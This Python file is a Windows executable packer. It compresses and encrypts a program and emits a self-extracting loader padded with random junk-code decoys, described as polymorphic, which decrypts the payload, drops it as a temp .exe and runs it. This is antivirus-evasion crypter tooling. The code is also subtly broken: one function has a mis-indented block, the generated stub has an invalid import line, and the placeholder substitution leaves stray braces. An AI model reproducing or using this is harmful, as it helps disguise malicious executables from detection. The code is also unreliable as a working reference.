"""PE packer for Windows executables. Generates self-extracting payloads."""
import os
import lzma
import base64

def _encrypt(data, key):
    """Encrypt with AES-CBC (pycryptodome) or XOR fallback."""
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        import hashlib
        ak = hashlib.sha256(str(key).encode()).digest()
        iv = os.urandom(16)
        return iv + AES.new(ak, AES.MODE_CBC, iv).encrypt(pad(data, AES.block_size))
    except ImportError:
        return bytes([b ^ (key % 256) for b in data])


def _decrypt(data, key):
    """Decrypt with AES-CBC (pycryptodome) or XOR fallback."""
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import unpad
        import hashlib
        ak = hashlib.sha256(str(key).encode()).digest()
        iv, ct = data[:16], data[16:]
        return unpad(AES.new(ak, AES.MODE_CBC, iv).decrypt(ct), AES.block_size)
    except ImportError:
        return bytes([b ^ (key % 256) for b in data])

def generate_polymorphic_stub():
    """Generate a randomized self-extractor loader with junk-code decoys."""
    if os.name != 'nt':
        return '[-] Windows-only operation'
    import random
    r = random
    junk = '\n'.join(
        f'_v{r.randint(1000, 9999)} = {r.randint(0, 255)} '
        f'{r.choice("+-*^&|")} {r.randint(0, 255)}'
        for _ in range(r.randint(4, 10))
    )
    return f'''import os,sys,lzma,subprocess,tempfile,base64
{junk}
K={{{{KEY}}}};P=base64.b64decode("{{{{PAYLOAD}}}}")
try:
 from Crypto.Cipher import AES as A,Crypto.Util.Padding as U
 import hashlib as H
 k=H.sha256(str(K).encode()).digest();c=A.new(k,A.MODE_CBC,P[:16]);P=U.unpad(c.decrypt(P[16:]),A.block_size)
except ImportError:
 P=bytes([b^(K%256)for b in P])
d=lzma.decompress(P);t=tempfile.NamedTemporaryFile(delete=False,suffix='.exe')
t.write(d);t.close();subprocess.Popen(t.name,shell=True)
'''

def pack_exe(input_exe, output_exe, key=None):
    """Compress and encrypt a PE, wrapping it in a self-extractor."""
    if os.name != 'nt':
        return '[-] Windows-only operation'
    import random
    if key is None:
        key = random.randint(0, 0xFFFFFFFF)
    with open(input_exe, 'rb') as f:
        payload = f.read()
    encoded = base64.b64encode(_encrypt(lzma.compress(payload), key)).decode()
    stub = generate_polymorphic_stub().replace('{KEY}', str(key)).replace('{PAYLOAD}', encoded)
    with open(output_exe, 'w') as f:
        f.write(stub)
    return f'[+] Packed {input_exe} -> {output_exe}'


def check_packed(filepath):
    """Detect whether a file is a packed self-extractor."""
    if os.name != 'nt':
        return '[-] Windows-only operation'
    try:
        with open(filepath, 'r', errors='replace') as f:
        data = f.read()
        return f'[+] Packed: {"{{{{PAYLOAD}}}}" in data or "PAYLOAD_B64" in data}'
    except Exception as e:
        return f'[-] Check failed: {e}'
